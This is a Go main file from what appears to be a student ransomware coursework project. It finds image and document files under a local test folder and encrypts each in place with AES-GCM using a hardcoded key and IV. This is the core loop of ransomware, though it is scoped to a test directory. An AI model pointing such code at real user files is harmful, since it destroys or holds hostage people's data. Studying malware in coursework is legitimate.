package main

import (
	"ase/encrypt"
	"ase/utils"
	"fmt"
	"os"
	"runtime"
)

func main() {
	extensions := []string{"svg", "png", "jpg", "jpeg", "gif", "bmp", "tiff", "webp", "docx", "ppt", "txt"}

	// Check on which system the program is running
	var path string = ""
	switch os := runtime.GOOS; os {
	case "windows":
		path = "C:\\Users\\theol\\Documents\\EPITA\\SRS\\S8\\ase-malware\\tests"
	case "linux":
		path = "/mnt/c/Users/theol/Documents/EPITA/SRS/S8/ase-malware/tests"
	case "darwin":
		path = "/Users/theol/Documents/EPITA/SRS/S8/ase-malware/tests"
	default:
		path = ""
	}

	if path == "" {
		fmt.Println("Unknown OS")
		os.Exit(1)
	}

	files, err := utils.DiscoverDisk(path, extensions)
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}

	for _, file := range files {
		encrypt.Encrypt(file, "0123456789abcdef0123456789abcdef", "0123456789abcdef", "gcm")
	}

	// Print the number of files found
	fmt.Println(len(files))

}
